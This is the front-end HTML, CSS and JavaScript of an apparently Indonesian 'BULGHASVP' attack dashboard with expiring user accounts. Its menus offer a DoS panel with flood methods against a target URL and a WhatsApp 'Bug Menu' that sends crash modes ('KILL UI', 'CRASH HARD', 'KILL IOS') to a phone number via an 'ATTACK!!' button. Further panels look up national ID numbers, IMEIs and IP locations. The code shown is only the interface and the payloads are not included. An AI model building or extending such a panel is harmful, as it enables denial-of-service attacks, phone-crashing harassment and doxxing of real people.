  display: flex;
  flex-wrap: wrap;
  justify-content: center;
  gap: 20px;
  margin-top: 20px;
}

/* Style tombol utama */
.custom-btn {
  background: rgba(255, 230, 0, 0.1);         /* semi transparan */
  border: 1px solid rgba(255, 230, 0, 0.6);
  border-radius: 15px;
  padding: 20px 15px;
  width: 140px;
  height: 140px;
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: center;
  text-align: center;
  font-size: 14px;
  font-weight: 600;
  color: #ffeb3b;                             /* teks kuning neon */
  cursor: pointer;
  transition: 0.3s;
  box-shadow: 0 0 15px rgba(255, 230, 0, 0.4);
}

/* Hover efek tombol */
.custom-btn:hover {
  background: rgba(255, 230, 0, 0.2);
  box-shadow: 0 0 20px rgba(255, 230, 0, 0.8);
  transform: translateY(-5px);
}

/* Icon bulat di atas teks */
.icon-circle {
  width: 55px;
  height: 55px;
  border-radius: 50%;
  background: rgba(255, 230, 0, 0.15);
  display: flex;
  align-items: center;
  justify-content: center;
  margin-bottom: 10px;
  box-shadow: 0 0 10px rgba(255, 230, 0, 0.5);
  transition: 0.3s;
}

/* Icon di dalam lingkaran */
.icon-circle i {
  font-size: 22px;
  color: #ffeb3b;
}

/* Hover efek icon */
.custom-btn:hover .icon-circle {
  background: rgba(255, 230, 0, 0.4);
  box-shadow: 0 0 14px rgba(255, 230, 0, 0.9);
}

/* =====================
   Bug Menu Section
===================== */
#bug-section {
  background-color: #1a1a1a; /* Dark background */
  padding: 40px 20px;
  display: flex;
  justify-content: center;
}

#bug-section .card {
  background-color: #2b2b2b; /* Abu-abu lembut */
  padding: 30px 25px;
  border-radius: 20px;
  box-shadow: 0 0 20px rgba(200,200,200,0.2);
  text-align: center;
  max-width: 400px;
  width: 100%;
  color: #e0e0e0;
  font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
}

/* ----------------------
   Input nomor target
------------------------ */
#bug-section input#targetNumber {
  width: 200px;
  max-width: 100%;
  padding: 10px 12px;
  margin: 0 auto 20px auto;
  display: block;
  border: 2px solid #666;
  border-radius: 10px;
  background-color: #4a4a4a; /* Abu-abu apk style */
  color: #eee;
  font-size: 1em;
  text-align: center;
  outline: none;
  transition: 0.3s;
}

#bug-section input#targetNumber:focus {
  border-color: #aaa;
  box-shadow: 0 0 8px #bbb;
}

/* ----------------------
   Tombol mode lama (untuk referensi)
------------------------ */
.mode-btn {
  padding: 12px 10px;
  border: none;
  border-radius: 12px;
  background-color: #4a4a4a;
  color: #ddd;
  font-weight: bold;
  cursor: pointer;
  transition: 0.3s;
  box-shadow: 0 0 8px rgba(200,200,200,0.2);
}

.mode-btn:hover {
  background-color: #5a5a5a;
  box-shadow: 0 0 12px #bbb, 0 0 20px #ccc;
  color: #fff;
}

.mode-btn.full {
  grid-column: span 2;
}

/* ----------------------
   Tombol Execute
------------------------ */
.execute-button {
  padding: 14px 0;
  width: 100%;
  border: none;
  border-radius: 15px;
  background-color: #555;
  color: #eee;
  font-size: 1.1em;
  font-weight: bold;
  cursor: not-allowed;
  transition: 0.3s;
  box-shadow: 0 0 10px rgba(200,200,200,0.3);
}

.execute-button.enabled {
  cursor: pointer;
  background-color: #777;
  box-shadow: 0 0 15px #bbb, 0 0 25px #ccc;
}

/* ----------------------
   Tombol preview kotak APK
------------------------ */
.custom-btn-apk {
  width: 120px;      /* Lebar kotak */
  height: 120px;     /* Tinggi kotak */
  margin: 0 auto 20px auto;
  background: rgba(60,60,60,0.7);
  border: 1px solid rgba(200,200,200,0.2);
  border-radius: 16px;
  color: #eee;
  font-size: 16px;
  font-weight: 600;
  cursor: pointer;
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: center;
  position: relative;
  text-align: center;
  gap: 8px;
  transition: all 0.3s ease;
  box-shadow: 0 0 12px rgba(200,200,200,0.2);
  backdrop-filter: blur(6px);
}

.custom-btn-apk:hover {
  background: rgba(200,200,200,0.15);
  border-color: #ccc;
  box-shadow: 0 0 18px rgba(200,200,200,0.4), inset 0 0 10px rgba(200,200,200,0.2);
  transform: translateY(-3px);
  color: #fff;
}

.card-yellow {
  background: rgba(255, 255, 255, 0.05); /* transparan */
  border-left: 5px solid #f1c40f; /* garis kuning di samping */
  padding: 20px;
  border-radius: 12px;
  box-shadow: 0 4px 12px rgba(0,0,0,0.1);
  max-width: 500px;
  margin: auto;
}

.sender-box, .pair-box {
  background: rgba(255, 255, 255, 0.05); /* transparan */
  border-left: 3px solid #f1c40f; /* garis kuning samping */
  padding: 15px;
  margin-bottom: 15px;
  border-radius: 8px;
  transition: box-shadow 0.3s;
}

.sender-box:hover, .pair-box:hover {
  box-shadow: 0 0 15px #f1c40f70; /* cahaya kuning saat hover */
}

.sender-list {
  list-style: none;
  padding: 0;
}

.sender-list li {
  padding: 5px 0;
  border-bottom: 1px solid rgba(255,255,255,0.1);
}

input#pair-number {
  width: calc(100% - 100px);
  padding: 8px;
  border-radius: 5px;
  border: 1px solid #f1c40f33;
  background: rgba(255,255,255,0.05);
  color: #fff;
}

button.btn-yellow {
  background: #f1c40f;
  border: none;
  padding: 8px 15px;
  border-radius: 5px;
  color: #000;
  cursor: pointer;
}

button.btn-yellow:hover {
  background: #d4ac0d;
}

.result-box {
  margin-top: 10px;
  padding: 10px;
  background: rgba(0,0,0,0.3);
  border-radius: 5px;
  color: #fff;
  font-family: monospace;
  display: flex;
  justify-content: space-between;
  align-items: center;
}

.result-box button {
  background: #f1c40f;
  border: none;
  padding: 5px 10px;
  border-radius: 4px;
  cursor: pointer;
}


/* =====================
   Kotak logo terpisah (atas)
===================== */
.logo-box-square {
  width: 140px;   
  height: 140px;
  border-radius: 20px;
  background: rgba(255, 230, 0, 0.08);
  box-shadow: 0 0 20px rgba(255, 230, 0, 0.4);
  display: flex;
  align-items: center;
  justify-content: center;
  margin: 0 auto 20px auto; /* biar di tengah dan ada jarak ke bawah */
}

/* Logo bulat di dalam kotak */
.logo-box-square .logo-circle {
  width: 100px;
  height: 100px;
  border-radius: 50%;
  overflow: hidden;
  box-shadow: 0 0 12px rgba(255, 230, 0, 0.7);
}

.logo-box-square .logo-circle img {
  width: 100%;
  height: 100%;
  object-fit: cover;
}

/* ----------------------
   Teks label di bawah logo (kuning neon)
------------------------ */
/* Label teks */
.button-label {
  margin-top: 12px;
  font-size: 16px;
  font-weight: 600;
  color: #ffeb3b;
  text-shadow: 0 0 6px rgba(255, 230, 0, 0.9),
               0 0 12px rgba(255, 230, 0, 0.6);
  display: block;
}

.top-button-preview:hover .button-label {
  color: #fff176; /* agak terang pas hover */
  text-shadow: 0 0 8px rgba(255, 230, 0, 1),
               0 0 16px rgba(255, 230, 0, 0.9);
}

/* =====================
   Custom APK-style Dropdown
===================== */
.select-container {
  margin: 20px 0;
  text-align: center;
}

.custom-select {
  position: relative;
  background: rgba(60,60,60,0.7);
  color: #eee;
  font-weight: 600;
  border-radius: 16px;
  padding: 14px 12px;
  cursor: pointer;
  user-select: none;
  box-shadow: 0 0 12px rgba(200,200,200,0.2);
  backdrop-filter: blur(6px);
  transition: all 0.3s ease;
}

.custom-select .selected {
  display: block;
  text-align: center;
}

.custom-select .options {
  position: absolute;
  top: 100%;
  left: 0;
  width: 100%;
  background: #2b2b2b;
  border-radius: 12px;
  margin-top: 5px;
  box-shadow: 0 0 12px rgba(200,200,200,0.3);
  display: none;
  flex-direction: column;
  z-index: 10;
}

.custom-select .option {
  padding: 12px 10px;
  text-align: center;
  border-bottom: 1px solid rgba(200,200,200,0.2);
  cursor: pointer;
  transition: all 0.3s;
}

.custom-select .option:last-child {
  border-bottom: none;
}

.custom-select .option:hover {
  background: rgba(200,200,200,0.15);
  color: #fff;
  transform: translateY(-2px);
}

.custom-select.active .options {
  display: flex;
}
/* Card music player */
#music-section .card {
  background: rgba(255, 230, 0, 0.08); /* semi transparan kuning */
  border: 1px solid rgba(255, 230, 0, 0.4);
  border-radius: 15px;
  padding: 20px;
  text-align: center;
  color: #ffeb3b;
  box-shadow: 0 0 15px rgba(255, 230, 0, 0.3);
  max-width: 350px;
  margin: 20px auto;
}

/* Judul */
#music-section h2 {
  margin-bottom: 15px;
  font-size: 20px;
  color: #ffeb3b;
  text-shadow: 0 0 6px rgba(255, 230, 0, 0.8);
}

/* Tombol kontrol */
#music-section button {
  background: rgba(255, 230, 0, 0.15);
  border: 1px solid rgba(255, 230, 0, 0.4);
  border-radius: 50%;
  color: #ffeb3b;
  font-size: 18px;
  padding: 10px 14px;
  margin: 5px;
  cursor: pointer;
  transition: 0.3s;
  box-shadow: 0 0 8px rgba(255, 230, 0, 0.4);
}

#music-section button:hover {
  background: rgba(255, 230, 0, 0.3);
  box-shadow: 0 0 14px rgba(255, 230, 0, 0.7);
  transform: translateY(-3px);
}

/* Progress bar */
#progressBar {
  width: 100%;
  margin: 15px 0;
  -webkit-appearance: none;
  appearance: none;
  height: 6px;
  border-radius: 4px;
  background: rgba(255, 230, 0, 0.25);
  outline: none;
}

/* Progress fill */
#progressBar::-webkit-slider-thumb {
  -webkit-appearance: none;
  appearance: none;
  width: 14px;
  height: 14px;
  border-radius: 50%;
  background: #ffeb3b;
  cursor: pointer;
  box-shadow: 0 0 6px rgba(255, 230, 0, 0.7);
}

/* Judul lagu */
#currentTitle {
  margin: 10px 0;
  font-size: 14px;
  font-weight: 600;
  color: #fff176;
}

/* Playlist */
#playlist {
  list-style: none;
  padding: 0;
  margin-top: 10px;
  max-height: 120px;
  overflow-y: auto;
}

#playlist li {
  padding: 6px 10px;
  margin-bottom: 6px;
  border-radius: 8px;
  background: rgba(255, 230, 0, 0.1);
  color: #ffeb3b;
  cursor: pointer;
  transition: 0.3s;
}

#playlist li:hover {
  background: rgba(255, 230, 0, 0.25);
  box-shadow: 0 0 8px rgba(255, 230, 0, 0.4);
}

/* Lagu yang sedang diputar */
#playlist li.active {
  background: rgba(255, 230, 0, 0.4);
  color: #111;
  font-weight: bold;
}
/* ---------- Global card/base ---------- */
.section .card {
  background: rgba(255, 230, 0, 0.06);         /* semi transparan */
  border: 1px solid rgba(255, 230, 0, 0.25);
  border-radius: 14px;
  padding: 18px;
  max-width: 720px;
  margin: 18px auto;
  color: #ffeb3b;
  box-shadow: 0 6px 18px rgba(255, 230, 0, 0.08), inset 0 -2px 8px rgba(0,0,0,0.25);
  backdrop-filter: blur(4px);
}

/* Section headings */
.section .card h2 {
  margin: 0 0 12px;
  font-size: 18px;
  letter-spacing: 0.6px;
  color: #ffeb3b;
  text-shadow: 0 0 6px rgba(255, 230, 0, 0.55);
}

/* ---------- Inputs / selects ---------- */
.section input[type="text"],
.section input[type="number"],
.section select {
  width: 100%;
  box-sizing: border-box;
  padding: 12px 14px;
  margin: 8px 0 14px;
  border-radius: 14px;
  border: 1px solid rgba(255, 230, 0, 0.25);
  background: rgba(40, 40, 40, 0.65);
  color: #ffeb3b;
  outline: none;
  transition: all 0.3s ease;
  font-size: 14px;
  font-weight: 600;
  box-shadow: 0 0 10px rgba(255, 230, 0, 0.1) inset,
              0 0 12px rgba(0,0,0,0.35);
  backdrop-filter: blur(6px);
  appearance: none;            /* hilangkan default arrow */
  -webkit-appearance: none;
  -moz-appearance: none;

  /* custom arrow */
  background-image: url("data:image/svg+xml;utf8,<svg fill='yellow' height='20' viewBox='0 0 24 24' width='20' xmlns='http://www.w3.org/2000/svg'><path d='M7 10l5 5 5-5z'/></svg>");
  background-repeat: no-repeat;
  background-position: right 14px center;
  background-size: 16px;
  padding-right: 40px; /* space buat arrow */
}

/* placeholder styling */
.section input::placeholder {
  color: rgba(255, 235, 59, 0.55);
}

/* focus state */
.section input:focus,
.section select:focus {
  border-color: rgba(255, 230, 0, 0.6);
  box-shadow: 0 0 14px rgba(255, 230, 0, 0.35);
  background: rgba(0,0,0,0.55);
}

/* option styling */
.section select option {
  background: #1e1e1e;
  color: #ffeb3b;
  font-weight: 500;
}

/* ---------- Execute button ---------- */
.execute-button {
  display: inline-flex;
  align-items: center;
  gap: 8px;
  padding: 10px 14px;
  border-radius: 12px;
  border: 1px solid rgba(255, 230, 0, 0.4);
  background: linear-gradient(180deg, rgba(255,230,0,0.12), rgba(255,230,0,0.06));
  color: #111;
  font-weight: 700;
  cursor: pointer;
  transition: 0.25s;
  box-shadow: 0 8px 22px rgba(255, 230, 0, 0.08), 0 0 10px rgba(255,230,0,0.18);
}

/* icon inside button (FontAwesome) */
.execute-button i {
  font-size: 14px;
  color: #ffeb3b;
}

/* hover / active */
.execute-button:hover {
  transform: translateY(-4px);
  box-shadow: 0 12px 28px rgba(255, 230, 0, 0.18), 0 0 26px rgba(255,230,0,0.35);
  background: linear-gradient(180deg, rgba(255,230,0,0.22), rgba(255,230,0,0.12));
}

.execute-button:active {
  transform: translateY(-1px) scale(0.995);
}

/* Disabled state */
.execute-button[disabled] {
  opacity: 0.45;
  cursor: not-allowed;
  transform: none;
  box-shadow: none;
}

/* ---------- Result box ---------- */
.section .card > div[id$="Result"] {
  margin-top: 12px;
  padding: 10px;
  background: rgba(0,0,0,0.5);
  border-radius: 10px;
  border: 1px solid rgba(255, 230, 0, 0.08);
  color: #ffeb3b;
  min-height: 36px;
  font-size: 13px;
  box-shadow: inset 0 -2px 6px rgba(0,0,0,0.4);
}

/* special small notes */
.section .hint {
  font-size: 12px;
  color: rgba(255,235,59,0.8);
  margin-top: 6px;
}

/* ---------- Responsive / layout tweaks ---------- */
@media (min-width: 760px) {
  /* make inputs shorter in DOS panel so two can sit on one row if you want */
  #dos-section .card input[type="text"] { width: calc(65% - 8px); display: inline-block; margin-right: 8px; }
  #dos-section .card input[type="number"] { width: calc(35% - 8px); display: inline-block; }
}

/* neat focus ring for keyboard users */
.section input:focus-visible,
.section select:focus-visible,
.execute-button:focus-visible {
  outline: 3px solid rgba(255,230,0,0.12);
  outline-offset: 3px;
}

/* hanya mask untuk input[type="password"] */
.password-wrap input[type="password"] {
  -webkit-text-security: disc; /* hanya untuk password */
  /* styling lain */
  background: transparent;
  border: 1px solid rgba(255,255,255,0.08);
  padding: 6px 8px;
  border-radius: 6px;
  color: #fff;
  font-weight: 600;
  width: 160px;
}

/* ketika berubah ke text, kita pastikan masking hilang */
.password-wrap input[type="text"] {
  -webkit-text-security: none;
  color: #fff;
}

/* tombol mata */
.eye-btn { background: transparent; border: none; color:#ffeb3b; cursor:pointer; font-size:14px; padding:6px; }
#allmenu-section {
  margin-top: 1rem;
}

/* === Judul section === */
h3 {
  color: #dcae2a;
  font-weight: 600;
  margin-bottom: 0.6rem;
  text-shadow: 0 0 5px rgba(255, 208, 80, 0.3);
}

/* === Form styling === */
form {
  display: flex;
  flex-wrap: wrap;
  gap: 8px;
}

input,
select {
  flex: 1;
  padding: 8px;
  border-radius: 10px;
  border: 1px solid #e6ca4a;
  background-color: #fffef5;
  font-size: 0.9rem;
  color: #555;
  box-shadow: inset 0 0 4px rgba(255, 220, 100, 0.15);
  transition: border-color 0.3s, box-shadow 0.3s;
}

input:focus,
select:focus {
  border-color: #f1c40f;
  box-shadow: 0 0 6px rgba(241, 196, 15, 0.35);
  outline: none;
}
    /* 🌕 Section khusus AI */
    section#ai-section {
      width: 100%;
      display: flex;
      justify-content: center;
      align-items: center;
      background: linear-gradient(135deg, #0a0a0a, #1a1a00);
      padding: 50px 0;
    }

    .chat-container {
      background: #1b1b1b;
      width: 420px;
      height: 600px;
      border-radius: 20px;
      box-shadow: 0 0 25px rgba(255, 204, 0, 0.25);
      display: flex;
      flex-direction: column;
      overflow: hidden;
      border: 2px solid #ffcc00;
    }

    .chat-header {
      background: linear-gradient(90deg, #ffcc00, #ffb300);
      color: #1b1b1b;
      text-align: center;
      padding: 15px;
      font-size: 20px;
      font-weight: 700;
      letter-spacing: 1px;
      text-shadow: 0 1px 1px rgba(255, 255, 255, 0.2);
    }

    .messages {
      flex: 1;
      padding: 15px;
      overflow-y: auto;
      display: flex;
      flex-direction: column;
    }

    .message {
      margin: 8px 0;
      padding: 10px 14px;
      border-radius: 15px;
      max-width: 75%;
      line-height: 1.4em;
      white-space: pre-wrap;
      word-wrap: break-word;
      font-size: 15px;
    }

    .user {
      background: #2b2b2b;
      color: #fff;
      align-self: flex-end;
      border-bottom-right-radius: 5px;
    }

    .ai {
      background: #ffcc00;
      color: #1b1b1b;
      align-self: flex-start;
      border-bottom-left-radius: 5px;
      font-weight: 500;
    }

    .input-area {
      display: flex;
      border-top: 1px solid #444;
      padding: 10px;
      background: #121212;
    }

    input {
      flex: 1;
      padding: 10px;
      border: none;
      outline: none;
      border-radius: 10px;
      background: #2b2b2b;
      color: white;
      font-size: 15px;
    }

    button {
      margin-left: 8px;
      background: #ffcc00;
      border: none;
      color: #1b1b1b;
      padding: 10px 15px;
      border-radius: 10px;
      font-size: 15px;
      cursor: pointer;
      font-weight: bold;
      transition: 0.3s;
    }

    button:hover {
      background: #ffb300;
    }

    /* Scrollbar biar matching */
    .messages::-webkit-scrollbar {
      width: 6px;
    }
    .messages::-webkit-scrollbar-thumb {
      background: #ffcc00;
      border-radius: 3px;
    }
</style>
</head>
<body>

  <!-- Sidebar -->
  <div class="sidebar" id="sidebar">
    <div class="sidebar-header">
      <img src="https://files.catbox.moe/pasf0a.jpg" alt="logo">
    </div>
    <div class="sidebar-menu">
      <a href="#" onclick="showSection('home-section', this)"><i class="fas fa-home"></i> Dashboard</a>
      <a href="#" onclick="showSection('chat-section', this)"><i class="fa fa-comments"></i> Chat</a>
      <a href="#" onclick="showSection('music-section', this)"><i class="fa fa-music"></i> Music</a>
      <a href="#" onclick="showSection('ai-section', this)">
   <i class="fas fa-robot"></i> AI BULGHASVP
       </a>
      <a href="#" onclick="showSection('allmenu-section', this)">
  <i class="fas fa-th"></i> All Menu</a>
      <a href="/userlist"><i class="fas fa-users-cog"></i> Manage User</a>
      <a href="/logout"><i class="fas fa-sign-out-alt"></i> Logout</a>
    </div>
  </div>

<!-- Topbar -->
<div class="topbar">
  <div class="menu-toggle" onclick="toggleSidebar()">
    <span class="menu-icon">☰</span>
    <span class="brand">BULGHASVP Is Back</span>
  </div>
  <div></div>
</div>

  <!-- Dashboard -->
  <section class="section active" id="home-section">
    <div class="card">
      <div class="banner">
        <div class="art">
          <img src="https://files.catbox.moe/pasf0a.jpg" alt="banner">
        </div>
        <div class="info">
          <p><b>Username:</b> <span id="bannerUsername">${username}</span></p>
<p>
  <b>Password:</b>
  <span class="password-wrap">
    <input id="bannerPassword" type="password" value="${password}" readonly />
    <button id="togglePasswordBtn" class="eye-btn" aria-label="Show password" type="button">
      <i id="toggleIcon" class="fas fa-eye"></i>
    </button>
  </span>
</p>
          <p><b>Role:</b> <span id="bannerRole">${role}</span></p>
          <p><b>Expired:</b> <span id="bannerExpired">${formattedTime} - Remaining: ${sisaHari} days</span></p>
        </div>
      </div>

      <div class="actions">
  <div class="circle-nav" onclick="showSection('allmenu-section', this)">
    <i class="fas fa-th"></i>
    <span>All Menu</span>
  </div>
  <div class="circle-nav" onclick="showSection('chat-section', this)">
    <i class="fas fa-comments"></i>
    <span>Chat</span>
  </div>
  <div class="circle-nav" onclick="showSection('music-section', this)">
    <i class="fas fa-music"></i>
    <span>Music</span>
  </div>
  <div class="circle-nav" onclick="window.location.href='/userlist'">
  <i class="fas fa-users-cog"></i>
  <span>Manage User</span>
 </div>
</div>

<a href="https://t.me/namachannel" target="_blank" class="telegram">
  🔥 Telegram Channel: Join To Get More Info!
</a>

      <div class="stats">
        <div class="card">
          <h3>Team & Credits</h3>
          <div class="mini-card">
            <div class="meta">
              <p class="pill"><b>Xanderr</b>: Website Builder</p>
              <p class="pill"><b>AI</b>: Helper</p>
              <p class="pill"><b>Coming-Soon</b>: My Team</p>
            </div>
          </div>
      <h3>Status Server</h3>
  <div class="kv"><div>Online Users</div><div id="onlineUsers">0</div></div>
  <div class="kv"><div>Active Sender</div><div id="activeSender">0</div></div>
        </div>
        <div class="card">
          <h3 style="color:#ff0;margin-top:6px">Profile</h3>
          <div style="margin-top:10px">
            <p><b>Username:</b> <span id="profileUser">${username}</span></p>
            <p><b>Role:</b> <span id="profileRole">${role}</span></p>
            <p><b>Status:</b> <span id="profileStatus">Active</span></p>
          </div>
        </div>
      </div>
    </div>
  </section>
  
<!-- Section Menu -->
<section class="section" id="allmenu-section">
  <h2>🔥 Custom Button UI</h2>
  <div class="button-container">
    <button class="custom-btn" onclick="showSection('dos-section')">
      <div class="icon-circle"><i class="fas fa-bolt"></i></div>
      DDoS Panel
    </button>
    <button class="custom-btn" onclick="showSection('bug-section')">
      <div class="icon-circle"><i class="fab fa-whatsapp"></i></div>
      WhatsApp
    </button>
    <button class="custom-btn" onclick="showSection('nik-section')">
      <div class="icon-circle"><i class="fa fa-id-card"></i></div>
      Parser Nik
    </button>
    <button class="custom-btn" onclick="showSection('tracking-section')">
      <div class="icon-circle"><i class="fa fa-search"></i></div>
      Tracking IP
    </button>
        <button class="custom-btn" onclick="showSection('imei-section')">
      <div class="icon-circle"><i class="fa fa-mobile-alt"></i></div>
      Cek Imei
    </button>
  </div>
</section>

  <!-- ⚡ AI SECTION -->
  <section class="section" id="ai-section">
    <div class="chat-container">
      <div class="chat-header">⚡ BULGHASVP AI</div>

      <div class="messages" id="messages"></div>

      <div class="input-area">
        <input type="text" id="userInput" placeholder="Ketik pesan lo di sini..." />
        <button id="sendBtn">Kirim</button>
      </div>
    </div>
  </section>

  <section class="section" id="bug-section">
  <div>
    <!-- BOX LOGO (atas) -->
    <div class="logo-box-square">
      <div class="logo-circle">
        <img src="https://files.catbox.moe/pasf0a.jpg" alt="Logo">
      </div>
    </div>

    <!-- BOX BUG MENU (bawah) -->
    <div class="card-yellow">
      <span class="button-label">Bug Menu</span>
      <!-- Input nomor target -->
      <input id="targetNumber" type="text" placeholder="62xxxx" />

      <!-- Custom APK-style Dropdown -->
      <div class="select-container">
        <div class="custom-select" id="customSelect">
          <span class="selected">Pilih Mode</span>
          <div class="options">
            <div class="option" data-value="androdelay2">BULGHASVP - KILL UI</div>
            <div class="option" data-value="androdelay">BULGHASVP - CRASH HARD</div>
            <div class="option" data-value="iosfc">BULGHASVP - KILL IOS</div>
          </div>
        </div>
      </div>

      <!-- Execute Button -->
      <button class="execute-button" id="executeBtn" disabled>
        <i class="fas fa-rocket"></i> ATTACK!!
      </button>
    </div>

  </div>
</section>

  <!-- TRACKING IP -->
  <section class="section" id="tracking-section">
    <div class="card">
      <h2>Tracking IP</h2>
      <input type="text" id="ipInput" placeholder="e.g. 8.8.8.8">
      <button class="execute-button" id="trackBtn"><i class="fas fa-search"></i> TRACK</button>
      <div id="trackingResult" style="margin-top:10px;"></div>
    </div>
  </section>

  <!-- CEK NIK -->
  <section class="section" id="nik-section">
    <div class="card">
      <h2>Cek NIK</h2>
      <input type="text" id="nikInput" placeholder="16 digit">
      <button class="execute-button" id="nikBtn"><i class="fas fa-id-card"></i> CEK NIK</button>
      <div id="nikResult"></div>
    </div>
  </section>

  <!-- CEK IMEI -->
  <section class="section" id="imei-section">
    <div class="card">
      <h2>Cek IMEI</h2>
      <input type="text" id="imeiInput" placeholder="15 digit">
      <button class="execute-button" id="imeiBtn"><i class="fas fa-mobile-alt"></i> CEK IMEI</button>
      <div id="imeiResult"></div>
    </div>
  </section>

  <!-- DOS -->
  <section class="section" id="dos-section">
    <div class="card">
      <h2>DoS Attack Panel</h2>
      <input type="text" id="dosTarget" placeholder="Target URL">
      <input type="number" id="dosTime" placeholder="Duration (sec)">
      <select id="dosMethod">
        <option value="strike">Strike</option>
        <option value="flood">Flood</option>
        <option value="h2">HTTP/2 Flood</option>
        <option value="mix">Mix</option>
      </select>
      <button class="execute-button" id="dosBtn"><i class="fas fa-rocket"></i> Launch</button>
      <div id="dosResult"></div>
    </div>
  </section>

<!-- GROUP CHAT -->
<section class="section" id="chat-section" style="display:none;">
  <div class="card" style="height:80vh;display:flex;flex-direction:column;">
    
    <h2 style="display:flex;align-items:center;gap:10px;margin-bottom:10px;">
      <img src="https://files.catbox.moe/pasf0a.jpg" 
           alt="Logo" 
           style="width:32px;height:32px;border-radius:50%;object-fit:cover;">
      Group Chat
    </h2>

    <div id="chatWindow" style="
      flex:1;
      overflow-y:auto;
      background: url('https://files.catbox.moe/5v9bs2.jpg') no-repeat center center;
      background-size: cover;
      padding:10px;
      border-radius:8px;
    "></div>

    <!-- Input -->
    <div style="display:flex;gap:8px;margin-top:10px;align-items:center;">
      <input type="file" id="fileInput" style="display:none;" />
      <button id="fileBtn" type="button"><i class="fas fa-paperclip"></i></button>

      <input type="file" id="imageInput" accept="image/*" style="display:none;" />
      <button id="imageBtn" type="button"><i class="fas fa-image"></i></button>

      <button id="recordBtn" type="button"><i class="fas fa-microphone"></i></button>

      <input type="text" id="chatInput" placeholder="Ketik pesan..." 
             style="flex:1;padding:8px;border-radius:8px;background:#222;color:#fff;">
      <button id="sendChatBtn" type="button"><i class="fas fa-paper-plane"></i></button>
    </div>
  </div>
</section>

  <!-- MUSIC -->
  <section class="section" id="music-section">
    <div class="card">
      <h2>Music Player</h2>
      <div>
        <button onclick="prevSong()">⏮</button>
        <button onclick="togglePlay()" id="playBtn">▶</button>
        <button onclick="nextSong()">⏭</button>
      </div>
      <input type="range" id="progressBar" value="0" min="0" max="100">
      <p id="currentTitle"></p>
      <ul id="playlist"></ul>
      <audio id="musicPlayer"></audio>
    </div>
  </section>

  <!-- Bottom nav -->
  <div class="bottom-nav">
    <div class="bottom-inner">
      <div class="nav-item active" onclick="showSection('home-section', this)">
        <div><i class="fas fa-home"></i></div><div>Home</div>
      </div>
      <div class="nav-item" onclick="showSection('allmenu-section', this)">
        <div><i class="fas fa-th"></i></div><div>All menu</div>
      </div>
      <div class="nav-item" onclick="showSection('chat-section', this)">
        <div><i class="fas fa-comments"></i></div><div>Chat</div>
      </div>
      <div class="nav-item" onclick="window.location.href='/logout'">
  <div><i class="fas fa-sign-out-alt"></i></div>
  <div>Logout</div>
     </div>
    </div>
  </div>

<script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
<script>

document.addEventListener('DOMContentLoaded', () => {
  // -- Sidebar / Sections
  function toggleSidebar() {
    document.getElementById("sidebar").classList.toggle("active");
  }

  function showSection(sectionId, navElem=null) {
    document.querySelectorAll('.section').forEach(s => {
      s.style.display = 'none';
      s.classList.remove('active');
    });
    const t = document.getElementById(sectionId);
    if (t) {
      t.style.display = 'block';
      t.classList.add('active');
    }
    document.querySelectorAll('.bottom-inner .nav-item').forEach(n => n.classList.remove('active'));
    if (navElem) navElem.classList.add('active');
    window.scrollTo({ top: 0, behavior: 'smooth' });

    const sidebar = document.getElementById('sidebar');
    if (window.innerWidth < 768 && sidebar.classList.contains('active')) sidebar.classList.remove('active');
  }

  window.toggleSidebar = toggleSidebar;
  window.showSection = showSection;

  // -- Banner / Profile init
  const profileUsername = "${username}";
  const role = "${role}";
  document.getElementById('bannerUsername').textContent = profileUsername;
  document.getElementById('bannerRole').textContent = role;
  document.getElementById('profileUser').textContent = profileUsername;
  document.getElementById('profileRole').textContent = role;

  // ✅ Tambahin ini: tampilkan home-section di awal
  showSection("home-section");
  
  // --------------------
  // Custom APK-style dropdown
  // --------------------
  const customSelect = document.getElementById('customSelect');
  if (!customSelect) return;
  
  const selected = customSelect.querySelector('.selected');
  const optionsContainer = customSelect.querySelector('.options');
  const optionsList = optionsContainer.querySelectorAll('.option');
  const targetInput = document.getElementById('targetNumber');
  const executeBtn = document.getElementById('executeBtn');
  let selectedMode = null;

  // Toggle dropdown (klik hanya di container)
  customSelect.addEventListener('click', (e) => {
    if (!e.target.classList.contains('option')) {
      customSelect.classList.toggle('active');
    }
  });

  // Pilih opsi
  optionsList.forEach(option => {
    option.addEventListener('click', (e) => {
      e.stopPropagation(); // penting supaya toggle tidak ikut terpanggil
      selected.textContent = option.textContent;
      selectedMode = option.dataset.value;

      // visual selected
      optionsList.forEach(o => o.classList.remove('selected'));
      option.classList.add('selected');

      customSelect.classList.remove('active');
      checkEnable();
    });
  });

  // Klik di luar untuk tutup dropdown
  document.addEventListener('click', (e) => {
    if (!customSelect.contains(e.target)) {
      customSelect.classList.remove('active');
    }
  });

  // Enable tombol execute
  function checkEnable(){
    const hasNumber = targetInput && targetInput.value.trim().length > 0;
    executeBtn.disabled = !(hasNumber && selectedMode);
    if(!executeBtn.disabled){
      executeBtn.classList.add('enabled');
    } else {
      executeBtn.classList.remove('enabled');
    }
  }

  if(targetInput){
    targetInput.addEventListener('input', checkEnable);
  }

  // validasi nomor
  function isValidNumber(number) {
    return /^62\\d{7,13}$/.test(number);
  }

  // Execute tombol action
  if(executeBtn){
    executeBtn.addEventListener('click', () => {
      const number = targetInput.value.trim();

      if(!isValidNumber(number)){
        if(typeof showToast==='function'){
          showToast("Target tidak valid. Harus dimulai dengan kode negara dan total 10-15 digit.");
        } else {
          alert("Target tidak valid. Harus dimulai dengan kode negara dan total 10-15 digit.");
        }
        return;
      }

      if(!selectedMode){
        if(typeof showToast==='function'){
          showToast("Pilih mode dulu!");
        } else {
          alert("Pilih mode dulu!");
        }
        return;
      }

      if(typeof showToast==='function'){
        showToast("Success Sending Bug");
      } else {
        alert("Success Sending Bug");
      }

      setTimeout(()=>{
        const url = '/execution?mode='+encodeURIComponent(selectedMode)+'&target='+encodeURIComponent(number);
        window.location.href = url;
      },1000);
    });
  }

// =================== Playlist Lagu ===================
const playlist = [
  { title: "Nina", url: "https://files.catbox.moe/e77qlu.m4a" },
  { title: "Tarot", url: "https://files.catbox.moe/m8h7z4.mp3" },
  { title: "O.Tuan", url: "https://files.catbox.moe/udh1c3.m4a" }
];

let currentSongIndex = 0;
const musicPlayer = document.getElementById("musicPlayer");
const playBtn = document.getElementById("playBtn");
const progressBar = document.getElementById("progressBar");
const currentTitle = document.getElementById("currentTitle");
